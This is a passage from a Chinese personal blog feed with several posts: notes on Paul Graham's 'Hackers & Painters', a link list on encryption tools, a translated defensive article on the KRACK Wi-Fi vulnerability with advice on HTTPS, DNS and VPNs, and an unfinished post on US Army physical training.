<p>历史上，机器内部的控制系统一直是物理装置：齿轮、杠杆和连接器等。但是，计算机的出现使得机器的控制系统逐渐变成了软件（包括数据（Data）在内的统称，例如胶片上的歌曲属于用物理方法压制在盘片上的数据）。互联网的出现使得复制品更容易流通，相关产业公司推动政府通过了严厉的法律，保护知识产权，作为对新技术的回应。</p>
<p>黑客反对知识产权制度的观点中，<strong>最重要的一条是保护人的“思想自由”</strong>。</p>
<blockquote>
<p>对于版权和专利这样的制度，黑客深感担忧。他们感到，保护“知识产权”的力度不断增大，已经威胁到了他们完成工作所必需的“思想自由”。（p54）</p>
</blockquote>
<hr>

<blockquote>
<p>立法者的愿意可能是好的。但是，他们也许没有意识到，这样的法律弊大于利。(p55)</p>
</blockquote>
<p>黑客（Hacker）群体在许多方面都表现出强烈的精英意识和自觉。例如，他们坚定地认为，知识产权制度无益于增加公众福利。不仅破坏思想自由权利，而且有加强极权主义制度的巨大危险。他们坚信，保护人的思想自由，就是保护国家持续发展根本动力，只有获得独步天下的技术优势，才有可能增加公众福利，反之，则是非常危险的。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Law-of-IP-EU-2015.png" alt=""></p>
<blockquote>
<p>在我看来，一个人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。专制国家会变成腐败国家，腐败国家会变成贫穷国家，贫穷国家会变成弱小国家。…. 极权主义制度只要形成了，就很难废除。黑客对于公民自由是非常敏感的，因为这对他们至关重要。他们远远地就能感到极权主义的威胁，好比动物能够感知即将来临的暴风雨。（p57）</p>
</blockquote>
<h2 id="黑客伦理（hacker-ethic）"><a href="#黑客伦理（hacker-ethic）" class="headerlink" title="黑客伦理（hacker ethic）"></a>黑客伦理（hacker ethic）</h2><p>黑客伦理（hacker ethic）是黑客文化中普遍存在的道德价值观和哲学观。起源于上世纪50~60年年代的麻省理工学院（MIT），一个比较流行的版本是由记者 Steven Levy在 1984 年出版的《黑客：计算机革命的英雄》（Hackers: Heroes of the Computer Revolution）一书种提出。</p>
<ul>
<li>(1)使用计算机以及所有有助于了解这个世界本质的事物都不应该收到任何限制。任何事情都应该亲手尝试。( Access to computers — and anything that might teach you something about the way to the world works — should be unlimited and total. Always yield to the Hands-On Imperative! )</li>
<li>(2)所有信息应该都是自由的。(All information should be free.)</li>
<li>(3)不信任权威，提倡去中心化。(Mistrust Authority — Promote Decentralization.)</li>
<li>(4)判断一名黑客的水平应该看他的技术能力，而不是他的学历、年龄或地位等其他标准。(Hackers should be judged by their hacking, not bogus criteria such as degrees, age, race, or position. )</li>
<li>(5)你可以用计算机创造美和艺术。(You can create art and beauty on a computer.)</li>
<li>(6)计算机使生活更美好。(Computers can change your life for the better.)</li>
</ul>
<blockquote>
<p>“黑客伦理”的一个必然推论就是，黑客不服从管教，具有叛逆精神。黑客通常对管理者强加的，限制他们行为的愚蠢规定不屑一顾，会找出规避的方法。</p>
</blockquote>
<p><strong>Paul Graham：The people who break rules that are the source of America’s wealth and power.</strong><br><strong>只有那些不服从管教的人们，才是美国财富与力量的源泉</strong>。</p>
<h2 id="普通法"><a href="#普通法" class="headerlink" title="普通法"></a>普通法</h2><p>我们已经发现黑客习俗和英裔美国人普通法传统下的土地所有制理论在逻辑上非常类同 。从历史上讲 1 2 ，欧洲部落文化发明了这些传统 ，并改善了他们的冲突解决体系 ——从表达不清的 、半意识的习惯体系发展到掌握在部落智者记忆中明确的习惯法 ，并最终发展成为成书面制度 。也许 ，当我们人数不断增加 、当所有新成员的文化移入变得困难时 ，黑客文化也该做一些类似的事 ——将一些优秀实践发展成为规范 ，解决开源项目中可能出现的各种争议 ，并发展出一种可以让社区中资深成员调解纠纷的仲裁传统 。</p>
<h2 id="论设计者的品味"><a href="#论设计者的品味" class="headerlink" title="论设计者的品味"></a>论设计者的品味</h2><blockquote>
<p>黑客新想法的最佳来源，并非那些名字里有“计算机”三个字的理论领域，而是来自于其他创作领域。与其到“计算机理论”领域寻找创意，你还不如在绘画中寻找创意。（p21）</p>
</blockquote>
<ul>
<li>关于软件“版本”</li>
</ul>
<blockquote>
<p>软件是连续性渐变的，某些更新也许比较重大，但是“版本”概念不适用于互联网软件。（我们）什么时候 <strong>需要媒体宣传了</strong>，就开出一张单子，上面总结了自从上次“发布”以来，我们新增的所有功能，然后在上面填一个新的版本号，发出一个新闻稿，宣布新版本已经准备就绪了。真是神奇啊，从来没有人看穿我们的把戏。</p>
</blockquote>
<ul>
<li>用户需要的设计</li>
<li>用户要求的设计</li>
</ul>
<blockquote>
<p>“顾客永远是对的”，这是指评价优秀设计的标准看它能够多大程度上满足用户的需求。让用户满意并不等于迎合用户的一切要求。用户不了解所有可能的选择，也经常弄错自己真正想要的东西。做一个好的设计师就像做一个好医生一样。你不能头痛医头，脚痛医脚。病人告诉你症状，你必须找出他生病的真正原因，然后针对病因进行治疗。（p214）</p>
</blockquote>
<p><strong>将一个构思束之高阁，不仅意味着延迟它的实现，还意味着延迟所有在实现过程中激发的构思。</strong> 如果你正在设计某种新东西，就应该尽快拿出原型，听取用户的意见。</p>
<p>今天刚好读到另一篇文章，提出了很多具体的操作方案，可以作为一段注脚吧。作者在邱俊涛 <a href="http://abruzzi.github.com/2018/01/two-types-of-developer/">《团队里的两类程序员》</a> 一文中提出，程序员大致可以分为两大类，即：</p>
<ul>
<li>原型类程序员（prototyper）</li>
<li>产品类程序员（engineer）</li>
</ul>
<p>原型类程序员适用于项目得早期阶段，或者说 Idea 尚不明确的阶段，设计者基于一个易于修改的媒体介质（比如 HTML+CSS 页面，而不是 Photoshop 原图或“重型”代码），然后向客户及所有项目相关人来确认，然后根据反馈来快速调整。通过快速且轻量级的迭代原型设计，最大可能压缩反馈周期，避免返工。</p>
<p>产品类程序员则更适用于高度产品化的项目，对程序员的要求就会有不同，尤其需要具备严谨的工程实践经验，例如：安全意识、性能意识、容灾、高可用、自动化测试、软件架构、甚至代码管理、部署流程等方方面面，要求的是全生命周期的规范化，尤其注重软件内部质量（邱俊涛用的定语是“深刻而周全”）。</p>
<p>关于快速反馈的观点，个人觉得还有几点不成熟的想法，略作补充：</p>
<ul>
<li>原型必须 <strong>高度仿真</strong>，否则未必能收到好的效果，没有人可以在一个失真的想象中做出正确的决策。例如，如果项目背景追求美观和视觉效果，就得要求原型和最终上线版本有完全一样的样式输出；如果是业务逻辑复杂得人机交互，原型就必须包含所有原子操作和全套模拟数据；</li>
<li>包括设计师/BA 等人在内，都要求掌握快速原型方法、轻量级编程能力、具备多样化技术能力（前后端），真正的 Hacker 几乎都是通才；</li>
<li>轻量级的迭代过程同样需要精细化，例如构建通用的模块化原型资源，大量利用 CDN ，全程使用版本管理工具等；</li>
<li>不管采用哪一类程序员，都不存在“物美价廉”这种情况，至少不应成为首先考虑的因素，他们的投入产出比都有公允的市场价格体现。</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">IT科技史漫谈：Linus Torvalds 与 Linux 操作系统</a></li>
<li><a href="http://www.jianshu.com/p/841862adb059">中文翻译| Linus Torvalds: The mind behind Linux</a></li>
<li><a href="https://www.ted.com/talks/linus_torvalds_the_mind_behind_linux?language=en#t-1278100">TED现场版| The mind behind Linux</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/global-view.png" alt=""></p>
<ul>
<li>《枪，帆船，帝国：技术革新在1400-1700年欧洲扩张早期阶段的作用》</li>
</ul>
<p>（Guns, Sails, and Empires: Technological Innovation and the Early Phases of European Expansion 1400-1700） Carlo Cipolla 著，Pantheon，1965 年出版。</p>
<ul>
<li>《黑客：计算机革命的英雄》（Hackers: Heroes of the Computer Revolution）| Steven Levy，1984</li>
<li>《刺杀戴高乐》弗雷德里克·福赛思</li>
</ul>
<h2 id="扩展阅读：《The-Cyber-Security-Master》"><a href="#扩展阅读：《The-Cyber-Security-Master》" class="headerlink" title="扩展阅读：《The Cyber-Security Master》"></a>扩展阅读：<a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处网络安全与科技罪案调查科</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.ruanyifeng.com/docs/pg/">阮一峰 |《黑客与画家：硅谷创业之父Paul Graham文集》</a></li>
<li><a href="http://abruzzi.github.com/2018/01/two-types-of-developer/">邱俊涛 | 团队里的两类程序员</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
        <tag>架构师</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security-Secrets</title>
    <url>/2019/04/22/CyberSecurity-Secrets/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="The-Big-Picture"><a href="#The-Big-Picture" class="headerlink" title="The Big Picture"></a>The Big Picture</h2><h4 id="加密-vs-安全"><a href="#加密-vs-安全" class="headerlink" title="加密 vs 安全"></a>加密 vs 安全</h4><h2 id="Open-Source"><a href="#Open-Source" class="headerlink" title="Open Source"></a>Open Source</h2><ul>
<li><a href="https://gopenpgp.org/" target="_blank" rel="noopener">GopenPGP</a><br>An OpenPGP Wrapper for Go - <a href="https://gopenpgp.org/" target="_blank" rel="noopener">https://gopenpgp.org/</a>  (Developed by ProtonMail and built on a fork of the Go crypto package.)</li>
</ul>
<ul>
<li><a href="https://github.com/FiloSottile/mkcert" target="_blank" rel="noopener">FiloSottile/mkcert</a><br>A simple zero-config tool to make locally trusted development certificates with any names you’d like. <a href="https://mkcert.dev" target="_blank" rel="noopener">https://mkcert.dev</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://zvelo.com/securely-logging-tracing-http-requests-go/" target="_blank" rel="noopener">https://zvelo.com/securely-logging-tracing-http-requests-go/</a></li>
<li><a href="https://nacl.cr.yp.to/box.html" target="_blank" rel="noopener">NaCl: Networking and Cryptography library</a></li>
<li><a href="https://godoc.org/golang.org/x/crypto/openpgp" target="_blank" rel="noopener">package golang.org/x/crypto/openpgp</a></li>
<li><a href="https://zh.wikipedia.org/wiki/PGP" target="_blank" rel="noopener">维基百科：PGP</a></li>
<li><a href="https://saltpack.org" target="_blank" rel="noopener">saltpack | a modern crypto messaging format</a>:saltpack is a binary message format, encoded using the <a href="https://msgpack.org" target="_blank" rel="noopener">MessagePack</a> format.</li>
<li><a href="https://opensource.com/article/19/2/secrets-management-tools-git" target="_blank" rel="noopener">4 secrets management tools for Git encryption | See how Git-crypt, BlackBox, SOPS, and Transcrypt stack up for storing secrets in Git.</a></li>
<li><a href="https://linuxconfig.org/how-to-encrypt-your-dns-with-dnscrypt-on-ubuntu-and-debian" target="_blank" rel="noopener">How to Encrypt Your DNS With DNSCrypt on Ubuntu and Debian</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>Cyber-Security:警惕Wi-Fi漏洞</title>
    <url>/2017/10/29/CyberSecurity-WiFi/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>1、不可信任的基础设施：Wi-Fi</li>
<li>2、安全通信协议：HTTPS</li>
<li>3、历史遗留问题：DNS</li>
<li>4、最后一英里的安全：VPN</li>
</ul>
<span id="more"></span>
<h2 id="Cyber-Security-警惕-Wi-Fi-漏洞-KRACK"><a href="#Cyber-Security-警惕-Wi-Fi-漏洞-KRACK" class="headerlink" title="Cyber-Security: 警惕 Wi-Fi 漏洞 KRACK"></a>Cyber-Security: 警惕 Wi-Fi 漏洞 KRACK</h2><ul>
<li><a href="https://www.linux.com/blog/2017/10/tips-secure-your-network-wake-krack">原文：Tips to Secure Your Network in the Wake of KRACK | KONSTANTIN RYABITSEV OCTOBER 18, 2017</a></li>
</ul>
<p>KRACK 攻击将目标放在你的移动设备和 Wi-Fi 接入点之间的链路，它可能是一台路由器 —— 在你的家里、办公室、社区图书馆或者你最喜欢咖啡店。 下面这些技巧能够帮助您提高网络连接的安全性。</p>
<p>密钥重安装攻击 （KRACK, Key Reinstallation Attacks)  概要如下:</p>
<ul>
<li>基于 WPA2 无线握手协议的漏洞，攻击者可能在你的设备和Wi-Fi接入点之间嗅探或者操纵流量</li>
<li>WPA2 标准存在定义含糊以及标准实现不够严谨，特别是对于 Linux 和 Android 设备来说问题尤其糟糕。事实上，在底层操作系统被修补之前，该漏洞允许攻击者强制所有无线通信流量不进行任何加密。</li>
<li>这个漏洞可以在客户端修补，所以事情并没有到不可收拾的地步。WPA2 无线加密标准并没有过时，WEP （Wired Equivalent Privacy，有线等效保密协议）标准也是同样的道理（解决该问题的方案并不是切换到 WEP ）。</li>
<li>最流行的 Linux 发行版已经在客户机上发送修复此漏洞的更新，所以需要尽快更新。</li>
<li>Android 将很快为这个漏洞推送补丁程序。如果您的设备正在接收 Android 安全补丁，您不久就会收到一个修复程序。如果您的设备不再接收这样的更新，那么这个特殊的漏洞仅仅是您停止使用旧的、不支持更新的 Android 设备的另一个原因。</li>
</ul>
<p>也就是说，从我的观点来看，Wi-Fi 仅仅是不可信任基础设施链条中的另一个环节，我们应该避免把它当作完全可信的通信渠道。</p>
<h4 id="1、不可信任的基础设施：Wi-Fi"><a href="#1、不可信任的基础设施：Wi-Fi" class="headerlink" title="1、不可信任的基础设施：Wi-Fi"></a>1、不可信任的基础设施：Wi-Fi</h4><p>如果现在阅读本文是通过你的笔记本电脑或者移动电话，那么你的通信链可能看起来应该是这样的：<br><img src="http://riboseyim-qiniu.riboseyim.com/BlankNetworkDiagram-Basics.png" alt=""></p>
<p>KRACK 攻击将目标放在你的移动设备和 Wi-Fi 接入点之间的链路，它可能是一台路由器 —— 在你的家里、办公室、社区图书馆或者你最喜欢咖啡店。<br><img src="http://riboseyim-qiniu.riboseyim.com/BlankNetworkDiagram-WhereKrackshappen.png" alt=""></p>
<p>实际上，这个图应该类似于这样：<br><img src="http://riboseyim-qiniu.riboseyim.com/BlankNetworkDiagram-Everywhere.png" alt=""></p>
<p>Wi-Fi 仅仅是我们漫长的通信链中的第一个不应该信任的环节。如果让我猜的话，你正在使用的 Wi-Fi 路由器可能从开始使用的那天起就没有收到过安全更新。更糟的是，它可能是默认的或容易被猜到的管理凭据（用户名/口令/密钥等），从来就没有更改过。除非你自己初始化并配置了路由器，同时你还能记住自己最后一次是什么时候更新它的固件，总之，你应该假设它现在是由别人控制，不能被信任。</p>
<p>通过 Wi-Fi 路由器，我们进入了一个由各类不可信任基础设施覆盖的区域 — 取决于你的偏执狂水平。在我们的上游有各类 ISP 和服务提供商，他们中的许多人捕获，监视，改变，分析和销售我们的个人流量，试图从我们的浏览习惯中获得更多的钱。通常，他们自己的安全补丁计划留下了许多有待改进的地方，最终使我们的流量暴露在恶意人士的眼里。</p>
<p>通常在互联网上，我们不得不担心强大的、国家级的演员操纵核心网络协议（例如 <a href="https://en.wikipedia.org/wiki/BGP_hijacking">BGP hijacking，BGP 劫持</a> ） ，为了支持质量监控程序或者执行国家级的流量过滤能力。</p>
<h4 id="2、安全通信协议：HTTPS"><a href="#2、安全通信协议：HTTPS" class="headerlink" title="2、安全通信协议：HTTPS"></a>2、安全通信协议：HTTPS</h4><p>幸运的是，我们有一个基于不安全介质进行安全通信的解决方案，我们每天都在使用它 —— HTTPS 协议对我们的 Internet 流量进行点对点加密，并确保我们可以信任我们所通信的站点。</p>
<p>Linux 基金会发起 <a href="https://letsencrypt.org/">“Let’s Encrypt” 项目,Let’s Encrypt is a free, automated, and open Certificate Authority.</a>，便于网站所有者全球提供终端到终端的加密，这有助于确保任何受损的设备，我们的个人设备，我们要访问的网站之间没有通信泄密风险。</p>
<p>好吧…只能说尽量接近没有风险。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/BlankNetworkDiagram-HTTPS.png" alt=""></p>
<h4 id="3、历史遗留问题：DNS"><a href="#3、历史遗留问题：DNS" class="headerlink" title="3、历史遗留问题：DNS"></a>3、历史遗留问题：DNS</h4><p>即使我们忠实地使用 HTTPS 协议来创建一个可信的通信渠道，攻击者还有一个机会，访问我们的 Wi-Fi 路由器或改变我们的 Wi-Fi 流量 — 例如 KRACK 攻击 — 可以诱导我们同错误的网站通信。他们可以这样做事利用了另一个事实，即我们仍然十分依赖于 DNS —— 一种上世纪80年代开始应用，不加密，非常容易被欺骗协议。<br><img src="http://riboseyim-qiniu.riboseyim.com/BlankNetworkDiagram-LOLDNS.png" alt=""></p>
<p>DNS （Domain Name System，域名系统）可以将人类友好的域名例如“linux.com”转换成 IP 地址 —— 计算机可以基于 IP 地址相互通信。为了将域名转换成 IP 地址，计算机会查询解析器软件 —— 通常运行在 Wi-Fi 路由器上或操作系统本身。解析器将查询一个包括 “root” 域名服务器的分布式网络，找出系统在互联网上所谓的“权威”的信息，域名“Linux .com”对应的IP地址。</p>
<p>麻烦的是，上述过程都是基于未经身份验证的通信，很容易假冒，明文协议和响应都可以很容易地被攻击者改变，使查询返回不正确的数据。如果有人设法进行 DNS 查询欺骗并返回错误的IP地址，他们就可以操纵我们系统的 HTTP 请求到指定的地方。</p>
<p>幸运的是，HTTPS 协议有很多内置的保护，可以确保不容易被别人假装成另一个站点。恶意服务器上的 TLS 证书必须匹配您请求的 DNS名称 ，TLS 证书由一个卓有声誉的 数字证书认证中心(Certificate Authority， CA)签发 ，并获得浏览器认可。如果不是这样的话，浏览器会显示出一个很大的警告：你要与之沟通的主机不是他们所说的那个人。如果你看到这样的警告，在选择忽略之前，请格外小心，因为你可能会泄露你的秘密给那些会使用它们的人攻击你。</p>
<p>如果攻击者完全控制了路由器，他们首先可以阻止您的连接使用HTTPS，通过拦截服务器的响应，指示浏览器设置安全连接（这称为“SSL strip 攻击”）。为了帮助保护您免受这种攻击，网站可以增加一个 特殊响应报头，告诉浏览器它们在未来始终使用HTTPS 协议进行通信，但这只是在你的第一次访问之后才有效。对一些非常受欢迎的网站，浏览器现在包括一个硬编码的域名列表，可以设置在第一次访问的时候也使用 HTTPS 协议 。</p>
<p>DNS 欺骗的解决方案称为 DNSSEC （Domain Name System Security Extensions ，CDNS安全扩展，由 IETF 提供的一系列 DNS 安全认证的机制，RFC 2535 ），但它看起来距离被接受的那一天还很遥远，其中有一个重要的障碍 —— 实时感知。DNSSEC 普遍使用之前，我们必须假定，我们收到的 DNS 信息不完全可信的。</p>
<h4 id="4、最后一英里的安全：VPN"><a href="#4、最后一英里的安全：VPN" class="headerlink" title="4、最后一英里的安全：VPN"></a>4、最后一英里的安全：VPN</h4><p>所以，如果你不能信任 Wi-Fi — 和/或在地下室的无线路由器，它可能比你的大多数宠物的年龄都大，你可以采取什么措施来确保你的设备和互联网通信“最后一英里”的完整性呢？</p>
<p>一个可接受的解决方案是使用一个信誉良好的 VPN 提供商，在你的系统和基础设施之间建立安全通信链路。我们的希望在于他们比你的路由器厂商和你当前的互联网服务提供商更加关注安全，所以他们可以更好地保证您的流量不受嗅探，或者遏制恶意人士的骚扰。让你所有的工作站和移动设备使用 VPN ，可确保类似  漏洞，例如 KRACK 攻击或不安全的路由器等，不影响你与外部世界通信的完整性。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/BlankNetworkDiagram-VPN.png" alt=""></p>
<p>这里的重要警告是，在选择 VPN 提供商时，必须保证它们的合理地可信性；否则，您只是同另一组恶意行为者进行交易。远离任何提供“免费 VPN”的提供商，他们很可能把你作为间谍目标，或者出售您的流量给营销公司赚钱。 </p>
<p>并非所有的设备都需要安装 VPN，但您每天使用的、涉及访问个人私人信息网站的—— 尤其是访问您的金钱和身份信息（政府、银行网站、社交网络等）的任何东西都必须得到安全保护。VPN 不是应对所有网络层漏洞的灵丹妙药，但它肯定会有所帮助，当你在机场使用不安全的 Wi-Fi 卡，或者下次类似 KRACK 漏洞被发现的时候。</p>
<h2 id="扩展阅读：《The-Cyber-Security-Master》"><a href="#扩展阅读：《The-Cyber-Security-Master》" class="headerlink" title="扩展阅读：《The Cyber-Security Master》"></a>扩展阅读：<a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/BGP_hijacking">BGP hijacking，BGP 劫持</a></li>
<li><a href="https://letsencrypt.org/">“Let’s Encrypt” 项目,Let’s Encrypt is a free, automated, and open Certificate Authority.</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5NjA0NjI5MQ==&amp;mid=402074320&amp;idx=1&amp;sn=e81d1be8ce013b813dd3a8cdd050d04f&amp;scene=1&amp;srcid=0117tzKNHcCeyGHrnkwjv2WN%23rd">2015年去过凯悦？请小心你的银行卡 | 2016-01-17 安全威胁情报</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>外军研究|美军体能训练</title>
    <url>/2017/11/05/Commander-PHT-USArmy/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-1.png" alt></p>
<h2 id="新兵－团队体能训练"><a href="#新兵－团队体能训练" class="headerlink" title="新兵－团队体能训练"></a>新兵－团队体能训练</h2><p>锻炼有助于提高灵活性，减少受伤，健康的体魄还能预防疾病，大约减少30%的患病几率<br>力量训练可以增强骨骼的强度和密度，改善循环 ，促进脑供血，这有助于提高思维和决策能力<br>锻炼有助于改善睡眠，睡眠可以为身体充电，为身体和精神提供能量，锻炼有助于缓解压力和焦虑。<br>军队体能体能测试主要侧重于评估战士的肌肉力量、耐力、心血管及呼吸系统的健康状况。</p>
<p>主要测试项目包括：俯卧撑（Push Up）、仰卧起坐（Sit-Up）、3公里跑（Running）<br>只有体能测试及格，才能继续服役，不允许不及格的军人存在。<br>体能训练的完成标准并不固定，根据每个人的年龄、身高、体重等有一个专门的表格。<br>例如22岁男性军人：至少31个俯卧撑，43个仰卧起坐，19分42秒内跑完3公里。游骑兵等特种部队标准高得多。<br>军种间似乎有一些差异。例如海军新兵训练营，貌似只要求你跑够5000米，但是也会插入特色跑法，如“跑到底”——不管快慢，跑到10000米以上，跑不动为止。海军新兵，当然还必须学会游泳，而且是先来个高台跳水，然后游。<br>除了制定严格的标准，同时按照团队模式组织训练，是团队融合进程的关键一环。</p>
<table><thead><tr><th>Age Group</th>
            <th>Gender</th>
            <th>Push-Ups</th>
            <th>Sit-Ups</th>
            <th>2-Mile Run</th>
        </tr></thead><tbody><tr><td>17&nbsp;- 21</td>
            <td>Male</td>
            <td>42</td>
            <td>53</td>
            <td>15:54</td>
        </tr><tr><td>&nbsp;</td>
            <td>Female</td>
            <td>19</td>
            <td>53</td>
            <td>18:54</td>
        </tr><tr><td>22&nbsp;- 26</td>
            <td>Male</td>
            <td>40</td>
            <td>50</td>
            <td>16:36</td>
        </tr><tr><td>&nbsp;</td>
            <td>Female</td>
            <td>17</td>
            <td>50</td>
            <td>19:36</td>
        </tr></tbody></table>

<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-7.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-8.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-9.png" alt></p>
<h3 id="新兵训练-控制饮食"><a href="#新兵训练-控制饮食" class="headerlink" title="新兵训练-控制饮食"></a>新兵训练-控制饮食</h3><p>海军版</p>
<p>可选套餐：A：两个圆饼  B：一个汉堡包  C：一块披萨或一个三明治   </p>
<p>其他小东西：水果、酸奶等。</p>
<p>早上、中午、晚上的饭量基本一样。每餐限量，不准吃太多。</p>
<p>但是没有人觉得饿，看着量少，吃进去却觉得很饱。但是让人总想上厕所，一会一趟。（哈哈！）</p>
<p>两个月新兵训练营之后，胖的很快就瘦了，瘦的也结实了。</p>
<h2 id="战伤救治训练"><a href="#战伤救治训练" class="headerlink" title="战伤救治训练"></a>战伤救治训练</h2><blockquote>
<p>美军从新兵训练开始，就包含了一系列战伤救治训练科目，游骑兵等特种部队的竞赛中还包含了复杂战术背景下的救治科目。</p>
</blockquote>
<p>新兵静脉注射训练中，更是要求所有人拿队友，真刀真枪的扎！<br>游骑兵特种部队－战术背景下的救治<br>游骑兵特种部队竞赛－战术背景下的救治处置</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-MT-Education-1.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-MT-Education-2.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-MT-Education-3.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-MT-Education-4.png" alt></p>
<h2 id="官兵一致"><a href="#官兵一致" class="headerlink" title="官兵一致"></a>官兵一致</h2><p>每名军人每年都必须进行体能评估。</p>
<p><strong>美军《军官晋升条例》：军人体能达标与晋升挂钩，连续3次体能考核不达标者即退出现役。</strong></p>
<p>我朝最年轻的毛少将，在美帝估计连个少尉都混不下去，呵呵呵。。。。<br>美军的体能训练，每名军官的年均体能训练时间都在510小时以上。</p>
<p>美国一直以来把体育教育作为军校必不可少的基础课，与文化教育和军事教育摆在同等重要的地位，尤其是西点军校的野兽营训练，更是让人“谈训色变”。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Education-1.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-PHT-Training-12.png" alt></p>
<h2 id="格斗训练"><a href="#格斗训练" class="headerlink" title="格斗训练"></a>格斗训练</h2><h3 id="练兵先练将"><a href="#练兵先练将" class="headerlink" title="练兵先练将"></a>练兵先练将</h3><p>全军统一的格斗训练学校：流水线培养教官队伍<br>综合权衡教学资源、训练时间和资金的限制，结合美军全球部署的特点，在佐治亚州本宁堡基地，设立了格斗训练学校，为全军各单位轮训培养格斗教官。</p>
<p><strong>集中训练的优势</strong></p>
